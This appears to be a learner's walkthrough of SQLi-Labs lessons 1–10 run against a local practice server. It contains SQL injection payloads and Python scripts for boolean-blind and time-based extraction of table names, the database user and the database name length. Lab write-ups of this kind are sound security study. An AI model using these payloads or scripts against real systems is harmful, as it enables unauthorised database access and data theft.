@@ -1,0 +1,377 @@
+less 1-
+for different values of id, different username and password is given
+
+we can assume that the guard against sqli is weak hence try putting a single quote followed by any statement i.e. ?id=' union select 1,'2
+it works except that it gives error that select statements have different number of columns.
+
+hence we can use an extra number i.e. ?id=' union select 1,2,'3
+
+we find that this works and returns name as 2 and password as 3
+hence the query must be
+
+select id,name,password from table_name where id='$_GET[id]'
+
+this can be exploited by simply adding a single quote at end of input and whatever we want after it.
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 2-
+in this if we try ?id=' assuming that the guard is weak, we get result
+
+ - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
+
+we see that ' LIMIT 0,1 is an error that is shown
+if we do ?id=\
+we get error
+
+ - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\ LIMIT 0,1' at line 1
+
+hence \ LIMIT 0,1 is what goes into the query
+we can translate the query as
+
+select id,name,password from table_name where id=$_GET[id] LIMIT 0,1
+
+to exploit this, we need to comment out the end of the query, and feed an empty value to id
+
+hence we do
+?id='' union 1,2,3 --+
+
+-------------------------------------------------------------------------------------------------------------------------
+
+
+less 3-
+
+again assume it to have weak guard against sqli,
+
+?id=1'
+ we get error -
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+
+end of query is '1'') LIMIT 0,1
+
+the query must be
+select id,name,password from table_name where id=('$_GET[id]') LIMIT 0,1
+
+hence to break the query, we just need to put the ending brackets ourselves and we can insert whaterver query we want after that
+
+i.e. ?id=') union select 1,2,('1
+or ?id=id=') union select 1,2,3 --+
+
+
+-------------------------------------------------------------------------------------------------------------------------
+
+
+less 4-
+again assume it to have weak guard against sqli,
+
+?id=1'
+
+but we get no output
+
+however if we try
+?id="
+we get
+- You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""") LIMIT 0,1' at line 1
+
+=> """) LIMIT 0,1
+therefore the query must be
+select id,name,password from table_name where id=("$_GET[id]") LIMIT 0,1
+
+hence to break it, we just need to place ") in id
+
+therefore the result is
+?id=") union select 1,2,3 --+
+
+-------------------------------------------------------------------------------------------------------------------------
+
+
+less 5 -
+in lesson 5, the output was quiet unexpected for different values of id
+for any value of id given, it outputs
+- You are in...........
+
+however if we input something to cause an error, it outputs the error
+also, if we give a value that doesn't exist in the list of values between 1 to 12, it shows no output
+
+hence we can either go with error based sqli or blind sqli
+
+I chose to use blind sqli. By using function substr() I will get all the values I need.
+for example,
+substr(database(),1,1)
+above query will return 's' as value
+now we can make this into a "yes or no" question by just doing
+
+substr(database(),1,1)='s'
+
+while trying out above query, I initially made a typo and found out that if I made a mistake in typing database as databse(), it returns an error -
+
+FUNCTION security.databse does not exist
+
+this error is returning the database name in the error message which can be exploited. anyways I continued with using substr()
+
+hence I wrote a program in python to get the values for me - 
+
+==================
+import requests
+
+
+url="http://localhost:8001"
+lesson = "/Less-5/"
+
+url = url + lesson
+
+info = "(select group_concat(table_name) from information_schema.tables where table_schema = database())"
+
+query = "length(" + info + ")="
+end = " -- +"
+for i in range(1000):
+	params={'id':"' or " + query + str(i) + end}
+	r = requests.get(url,params)
+	#print(r.url)
+	if "You are in" in r.text:
+		tmp1 = i
+		break
+
+returnval = ""
+query = "binary substr(" + info + ","
+for i in range(1,tmp1 + 1):
+	for j in range(48,123):
+		params = {'id':"' or " + query + str(i) + ",1)='" + chr(j) + "'" + end}
+		r = requests.get(url,params)
+		#print(r.url)
+		if "You are in" in r.text:
+			returnval += chr(j)
+			break
+print(returnval)
+=======================
+the program returns all the tbales within the database
+
+
+
+in this program we can easily get whichever avlue we want by changing the value in info. How this program works is as follows - 
+by the first for loop, it gets length of the output. Then for every letter at every position, it asks the database if the character it gives is at the specified location, using the substr() function.
+
+-------------------------------------------------------------------------------------------------------------------------
+
+
+less 6 - 
+
+I tried going with same approach as previous lesson and tried the query
+
+http://localhost:8001/Less-6/?id=' or substr(database(),1,1)='s' --+
+however it didn't return any value
+
+I thought it was similar to less-2 so I inserted 2 single quotes and tried. Even this doesn't work. I then went and tried something that would give me an error.
+http://localhost:8001/Less-6/?id=\
+this gives the error
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"\" LIMIT 0,1' at line 1
+
+here we can see - "\" LIMIT 0,1
+this shows that whatever we input is being enclosed within double quotes
+
+so I tried
+http://localhost:8001/Less-6/?id=" or 1=1 --+
+and this give the output You are in.
+so I just need to now slightly modify the previous python program so that this works in it
+
+
+===========================
+import requests
+
+
+url="http://localhost:8001"
+lesson = "/Less-6/"
+
+url = url + lesson
+
+info = "(current_user())"
+
+query = "length(" + info + ")="
+end = " -- +"
+
+for i in range(1000):
+    params={'id':'"' + " or " + query + str(i) + end}
+    r = requests.get(url,params)
+    #print(r.url)
+    if "You are in" in r.text:
+        tmp1 = i
+        break
+
+returnval = ""
+query = "binary substr(" + info + ","
+try:
+    for i in range(1,tmp1 + 1):
+        for j in range(48,123):
+            params = {'id':'"' + " or " + query + str(i) + ",1)='" + chr(j) + "'" + end}
+            r = requests.get(url,params)
+            #print(r.url)
+            if "You are in" in r.text:
+                returnval += chr(j)
+                break
+except NameError:
+    print("something wrong with query")
+    
+print(returnval)
+======================================
+
+the program returns the username used to access the database
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 7 -
+
+in this, whenever we input any correct value of id, it returns
+
+You are in.... Use outfile......
+
+and if we input a wrong value, it returns
+
+You have an error in your SQL syntax
+
+now we cannot find out how to break the query using the error that gets returned
+hence after a lot of fuzzing, I found out
+
+?id=0')) or 1=1 --+
+
+is giving me the output that is required
+
+hence we modify that bit in the program to get whatever is needed
+
+============
+import requests
+
+
+url="http://localhost:8001"
+lesson = "/Less-7/"
+
+url = url + lesson
+
+info = "(current_user())"
+
+query = "length(" + info + ")="
+end = " -- +"
+
+for i in range(1000):
+    params={'id':"0'))" + " or " + query + str(i) + end}
+    r = requests.get(url,params)
+    #print(r.url)
+    if "You are in" in r.text:
+        tmp1 = i
+        break
+
+returnval = ""
+query = "binary substr(" + info + ","
+try:
+    if(tmp1>0):
+        print("it is working!")
+except NameError:
+    print("something wrong with query")
+    exit()
+for i in range(1,tmp1 + 1):
+    for j in range(48,123):
+        params = {'id':"0'))" + " or " + query + str(i) + ",1)='" + chr(j) + "'" + end}
+        r = requests.get(url,params)
+        #print(r.url)
+        if "You are in" in r.text:
+            returnval += chr(j)
+            break
+
+    
+print(returnval)
+====================
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 8 -
+
+I have no idea what's supposed to be different in this one, it's literally the same as less 5 except that it doesn't give any error even if there is one.
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 9 -
+
+in this lesson, whatever we enter as id, it always gives the same output saying "You are  in"
+Trying to get error messages or anything won't work. 
+In this case if it's really using sql in the backend then, we can tell the database to wait for sometime if our query is true, using the sleep() function 
+and if() statement
+
+sleep(time) function takes time in seconds as its argument and waits that much time before returning a value
+if(condition, statement to execute if true, statement to execute if condition is false)
+
+first, we can check if we are able to break the query simply by adding " and sleep(10) -- " at the end of the query to see if there would be a delay of 10 seconds
+since we know that there is supposed to be a delay if the sleep executes.
+
+first I tried breaking the query with single quotes
+
+http://localhost:8001/Less-9/?id=1%27%20and%20sleep(10)%20--+
+
+it worked so now I wrote a program in python to also count the number of seconds that pass to get the response
+
+
+===========================
+
+import requests
+
+base_url = "http://localhost:8001/Less-9/"
+
+query = "sleep(1)"
+
+end = " -- "
+query_breaker = "' and "
+params = {'id': "1" + query_breaker + query + end}
+
+r = requests.get(base_url,params)
+print(r.content)
+print(r.url)
+print(r.elapsed.total_seconds())
+====================================
+
+
+using this program, we can take the minimum values to get response so that we can do things faster.
+
+we can now get database name using this program even though it would take lot of time.
+after running the query a few times and observing the response time, I find that it takes not more than 0.02 seconds to get a response. hence for maximum speed, I use a 0.05 second delay when the value is true
+
+therefore, I wrote the final program as -
+===================================
+import requests
+
+base_url = "http://localhost:8001/Less-9/"
+
+query = "sleep(0.05)"
+
+end = " -- "
+query_breaker = "' and "
+params = {'id': "1" + query_breaker + query + end}
+
+r = requests.get(base_url,params)
+print(r.content)
+print(r.url)
+print(r.elapsed.total_seconds())
+
+for i in range(100):
+    query = "if(length(database())=" + str(i) + ", sleep(0.05), null)"
+    params = {'id': "1" + query_breaker + query + end}
+    r = requests.get(base_url,params)
+    if r.elapsed.total_seconds() > 0.05:
+        print(i)
+        exit()
+=====================================
+to find the length of database name
+
+
+
+-------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+less 10-
+
+
+I used same program from less-9 for less-10 and it works, I think they're the same
+
+
+
